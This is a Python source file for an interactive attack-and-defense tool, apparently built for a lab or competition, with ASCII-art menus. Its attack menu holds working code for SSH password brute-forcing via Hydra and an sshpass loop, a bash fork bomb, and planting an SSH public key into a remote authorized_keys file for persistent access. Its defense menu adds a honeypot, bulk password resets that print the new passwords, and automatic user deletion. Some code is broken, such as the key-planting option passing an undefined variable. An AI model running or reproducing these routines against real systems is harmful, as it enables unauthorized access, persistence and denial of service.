import os
import subprocess
import itertools

import nmap
import socket
import threading
import logging
import random
import string
import pwd
import os
import paramiko

# Function to perform brute force using a .txt file
def brute_force_with_file_hydra(target, username, password_file):
    print(f"Starting brute force attack using Hydra with password file: {password_file}")
    try:
        # Hydra command to try each password in the file
        command = f"hydra -l {username} -P {password_file} ssh://{target} -t 4"
        # Run Hydra
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print("Hydra successfully cracked the password.")
        else:
            print("Hydra failed to crack the password.")
    except FileNotFoundError:
        print("Password file not found!")
    except Exception as e:
        print(f"An error occurred: {e}")


# Function to perform brute force by generating combinations (pure brute force)
def brute_force_pure(target, username, length=4, charset=string.ascii_lowercase + string.digits):
    print(f"Starting brute force attack using pure brute-force (length={length}, charset={charset})")
    for password_length in range(1, length + 1):
        # Generate all combinations of the characters for the current password length
        for password_tuple in itertools.product(charset, repeat=password_length):
            password = ''.join(password_tuple)  # Join the tuple to form the password string
            command = f"sshpass -p {password} ssh {username}@{target} 'echo Logged in!'"
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            if 'Logged in!' in result.stdout:
                print(f"Successfully logged in with password: {password}")
                return
            else:
                print(f"Failed with password: {password}")


def installer():
    subprocess.run(['pip', 'install', 'python-nmap'])
    subprocess.run(['sudo','apt-get','update'])
    subprocess.run(['sudo','apt-get','install','sshpass'])
def generate_password(length=12, use_uppercase=True, use_numbers=True, use_special=True):
    """Generates a random password based on specified criteria."""
    characters = string.ascii_lowercase  # Start with lowercase letters

    if use_uppercase:
        characters += string.ascii_uppercase  # Add uppercase letters
    if use_numbers:
        characters += string.digits  # Add digits
    if use_special:
        characters += string.punctuation  # Add special characters

    # Generate a random password
    password = ''.join(random.choice(characters) for _ in range(length))
    return password
def sshing(user,password,hostip):
    # SSH command
    command = f"sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{hostip}"
    # Run the command using subprocess
    subprocess.run(command, shell=True)

def change_all_user_passwords():
    """Changes passwords for all users."""
    users = pwd.getpwall()  # Get all users from the system

    for user in users:
        if user.pw_name not in ['root', 'nobody']:  # Skip root and nobody for safety
            new_password = generate_password(length=16)
            try:
                # Change the password for the user
                subprocess.run(['sudo', 'passwd', user.pw_name], input=f"{new_password}\n{new_password}\n", text=True, check=True)
                print(f"Changed password for {user.pw_name}: {new_password}")
            except subprocess.CalledProcessError as e:
                print(f"Failed to change password for {user.pw_name}: {e}")
    Defense()
def handle_connection(conn, addr):
    """Handles incoming connections."""
    logging.info(f"Connection from {addr} established.")
    conn.sendall(b'Welcome to the honeypot!\n')  # Sends a welcome message
    conn.close()  # Close the connection

def honeypot(port):
    try:
        """Sets up the honeypot server."""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(('0.0.0.0', port))  # Bind to all interfaces
        server.listen(5)  # Listen for incoming connections
        logging.info(f"Honeypot listening on port {port}...")
        flag = 1
        while True and flag == 1:
            conn, addr = server.accept()  # Accept a new connection
            threading.Thread(target=handle_connection, args=(conn, addr)).start()  # Handle in a new thread
    except OSError:
        print("Your honeypot is just fine... No need to execute it again")
        Defense()


def getfile():  
    # Get the list of users from /etc/passwd
    users = os.popen('cut -d : -f1 /etc/passwd').read().strip().split('\n')

    # Write the list of users to SleepyJoe.txt
    with open("SleepyJoe.txt", 'w') as f:
        f.write("Users on the system:\n")
        f.write("\n".join(users))
    
    # Return the path to the file
    return "SleepyJoe.txt"
def radar():
    def smell_smellies():
        # Get the list of users from /etc/passwd
        smellies = os.popen("cut -d: -f1 /etc/passwd").read().strip().split('\n')
        return smellies
    
    # Get the path to the file that contains the list of users
    chip = getfile()

    # If the chip file is None or not found, show an alert
    if chip is None:
        print("ALERT: SOMEONE MOVED YOUR SHIT!! THIS IS NOT TRUSTED ANYMORE REMEMBER YOURS")
        return
    else:
        # Open the SleepyJoe.txt file and read the list of saved users
        with open(chip) as f:
            actualpeople = f.read().strip().splitlines()

        # Get the current system users
        smelly = smell_smellies()

        # Find users that are in the system but not in the file
        usersD = [user for user in smelly if user not in actualpeople]

        # Print out the list of users that are missing from the file
        print(f"Users not in the file: {usersD}")

        # Remove users that are not in the file
        for user in usersD:
            try: 
                # Delete the user from the system
                subprocess.run(['sudo', 'deluser', user], check=True)
                print(f"Deleted user: {user}")
            except subprocess.CalledProcessError as e:
                print(f"Failed to delete user {user}: {e}")

        

        

def forkbomb():
    subprocess.run("bash -c ':(){ :|:& };:'", shell=True)





def tracker(filename="SleepyJoe.txt"):
    # Search the entire filesystem starting from the root directory
    for root, dirs, files in os.walk('/'):
        if filename in files:  # Check if the file exists in the current directory
            # Return the full path to the file
            return os.path.join(root, filename)
    
    # If the file is not found, return None
    print(f"{filename} not found in the filesystem.")
    return None


def generate_ssh_key():
    ssh_dir = os.path.expanduser('~/.ssh')
    private_key_path = os.path.join(ssh_dir, 'id_rsa')
    public_key_path = private_key_path + '.pub'

    # Check if SSH directory exists, if not, create it
    if not os.path.exists(ssh_dir):
        os.makedirs(ssh_dir)

    # Check if the private key already exists
    if not os.path.exists(private_key_path):
        print("Generating SSH key pair...")
        # Use subprocess to call the ssh-keygen command to generate the key pair
        subprocess.run(["ssh-keygen", "-t", "rsa", "-b", "2048", "-f", private_key_path, "-N", ""])

    return private_key_path, public_key_path


# Step 2: Copy the public key to the remote server
def copy_ssh_key_to_remote(remote_host, remote_user, public_key_path):
    try:
        # Read the public key
        with open(public_key_path, 'r') as f:
            public_key = f.read()

        # SSH to the remote machine using Paramiko
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically accept unknown keys

        # Connect to the remote machine
        ssh_client.connect(remote_host, username=remote_user)

        # Prepare the ~/.ssh directory on the remote server
        stdin, stdout, stderr = ssh_client.exec_command('mkdir -p ~/.ssh && chmod 700 ~/.ssh')

        # Append the public key to authorized_keys
        command = f'echo "{public_key.strip()}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'
        stdin, stdout, stderr = ssh_client.exec_command(command)

        # Close the SSH connection
        ssh_client.close()
        print(f"Public key copied to {remote_host} and added to authorized_keys.")

    except Exception as e:
        print(f"Error while copying SSH key: {e}")


# Step 3: Use the private key for passwordless SSH authentication
def test_ssh_login(remote_host, remote_user, private_key_path):
    try:
        # Create SSH client and load the private key
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Use private key for authentication
        private_key = paramiko.RSAKey.from_private_key_file(private_key_path)
        ssh_client.connect(remote_host, username=remote_user, pkey=private_key)

        # Test SSH login
        stdin, stdout, stderr = ssh_client.exec_command('echo "SSH Login successful!"')
        print(stdout.read().decode().strip())

        ssh_client.close()
    except Exception as e:
        print(f"Error during SSH login: {e}")

def dfense():

    blue = "\033[34m"  # Blue
    reset = "\033[0m"  # Reset color

    logo_text = f"""
{blue}                                                                         
 _|_|_|    _|_|_|_|  _|_|_|_|  _|_|_|_|  _|      _|    _|_|_|  _|_|_|_|  
 _|    _|  _|        _|        _|        _|_|    _|  _|        _|        
 _|    _|  _|_|_|    _|_|_|    _|_|_|    _|  _|  _|    _|_|    _|_|_|    
 _|    _|  _|        _|        _|        _|    _|_|        _|  _|        
 _|_|_|    _|_|_|_|  _|        _|_|_|_|  _|      _|  _|_|_|    _|_|_|_|  
{reset}                                                                         
    """
    print(logo_text)

def HONEYCOLOR():
    orange = "\033[38;2;231;154;63m"  # Custom RGB for #E79A3F
    reset = "\033[0m"  # Reset color

    logo_text = f"""
{orange}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⡷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠿⠿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣶⡶⠀⠀⠀⠀⢰⣶⣶⣶⣶⣶⣶⣶⣶⣶⣤⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠻⢿⣷⣀⣀⣀⣀⣸⣿⣿⣿⣿⣿⣿⣿⡿⠟⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣾⣿⡇⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⣿⣿⡇⠀⢀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⣼⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⠀⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⡀⢹⠀⢻⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠘⠛⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{reset}
    """
    print(logo_text)

def attacklogo():
    # ANSI escape sequence for red color
    RED = '\033[31m'
    RESET = '\033[0m'

    # Skull design
    skull = '''
    @@@@@                                        @@@@@
    @@@@@@@                                      @@@@@@@
    @@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
    @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
        @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
            @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
            @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
                @@@@@@@    @@@@@@    @@@@@@
                @@@@@@      @@@@      @@@@@
                @@@@@@      @@@@      @@@@@
                @@@@@@    @@@@@@    @@@@@
                @@@@@@@@@@@  @@@@@@@@@@
                    @@@@@@@@@@  @@@@@@@@@
                @@   @@@@@@@@@@@@@@@@@   @@
                @@@@  @@@@ @ @ @ @ @@@@  @@@@
            @@@@@   @@@ @ @ @ @ @@@   @@@@@
            @@@@@      @@@@@@@@@@@@@      @@@@@
        @@@@          @@@@@@@@@@@          @@@@
        @@@@@              @@@@@@@              @@@@@
    @@@@@@@                                 @@@@@@@
        @@@@@                                   @@@@@
    '''

    # Print the skull in red
    print(RED + skull + RESET)


def attack():
    attacklogo()
    print("1: SSH")
    print("2: Hydra crakc")
    print("3: ForkBomb")
    print("4: Drop SSH key")
    print("5 Back")
    j = input("Select: ")
    
    try:
        j = int(j)
        if j == 1:
            user = input("Please type username to login: ")
            passwd = input("Please type password: ")
            ipaddrhostname = input("Please type hostname or IP address: ")
            sshing(user,passwd, ipaddrhostname)
        if j == 2:
            print("Please select option.")
            print("1) Dictionary attack ")
            print("2) Bruteforce attack")
            input_type = input("Select option: ")
            input_type = int(input_type)
            if input_type == 1:
                target = input("Please type target IP address: ")
                username = input("Please type username: ")
                wordlist = input("Please type dictionary path: ")
                brute_force_with_file_hydra(target,username,wordlist)
            elif input_type == 2:
                target = input("Please type target IP address: ")
                username = input("Please type username: ")
                brute_force_pure(target, username)
            


        if j ==3: 
            forkbomb()
        if j == 4:
            key = generate_ssh_key()
            ip = input("Please type IP address or hostname: ")
            user = input("Please type username: ")
            
            copy_ssh_key_to_remote(ipaddrhostname,user,key)
            

        if j == 5:
            menu()
    except ValueError:
        print("You didn't press anything... Returning you to menu")
        menu()

def Defense():
    dfense()
    print("1: Honeypot")
    print("2: Change Passwords")
    print("3: Radar")
    print("4: NMAPPER")
    print("5 Back")
    j = input("Select: ")
    
    try:
        j = int(j)
        if j == 1:
            execHP()
        if j == 2:
            change_all_user_passwords()
        if j ==3: 
            radar()
        if j == 4:
            network = input("Type your main 3 ip sections ")
            network = network + ".0/24"

            nmapper(network)
        if j == 5:
            menu()
    except ValueError:
        print("You didn't press anything... Returning you to menu")
        menu()
def execHP():
    try:
    
        HONEYCOLOR()
        port = 22  # Change to your desired port
        honeypot_thread = threading.Thread(target=honeypot, args=(port,))
        honeypot_thread.daemon = True  # This allows the program to exit even if the thread is running
        honeypot_thread.start()  # Start the honeypot in the background
        
    
    except OSError:
        print("Your honeypot is being executed in background, relax...")
    finally:
        Defense()
def LOGO():
    yellow = "\033[33m"  # Yellow
    dark_blue = "\033[34m"  # Dark Blue
    red = "\033[31m"  # Red
    reset = "\033[0m"  # Reset color

    logo_text = f"""
{yellow} _|_|_|    _|_|_|  _|_|_|_|  _|      _|  _|      _|  _|_|_|_|  _|      _|  _|_|_|  _|_|_|      _|_|    
 _|    _|    _|    _|        _|_|    _|  _|      _|  _|        _|_|    _|    {yellow}_|    _|  _|    _|  
 _|_|_|      _|    _|_|_|    _|  _|  _|  _|      _|  _|_|_|    _|  _|  _|    {dark_blue}_|    _|  _|    _|  
 _|    _|    _|    _|        _|    _|_|    _|  _|    _|        _|    _|_|    {dark_blue}_|    _|  _|    _|  
 _|_|_|    _|_|_|  _|_|_|_|  _|      _|      _|      _|_|_|_|  _|      _|  _|_|_|  _|_|_|      _|_|    
{reset}
    """
    print(logo_text)





def nmapper(ranges):
    nm = nmap.PortScanner()
    nm.scan(hosts=ranges, arguments='-sn')

    for host in nm.all_hosts():
        mac_address = nm[host]['addresses'].get('mac', None)
        
        if mac_address and mac_address.startswith(('oo:05:69', '00:0C:29', '00:50:56')):
            print("VMWARE FOUND: " + host)
            

def menu():
    LOGO()
    installer()
    print("1) Attack \n 2) Defense \n 4) Exit ")
    i = input("Select: ")
    i = int(i)
    if i == 1:
        attack()
    if i == 2:
        Defense()
    if i == 3:
        pass
    
menu()



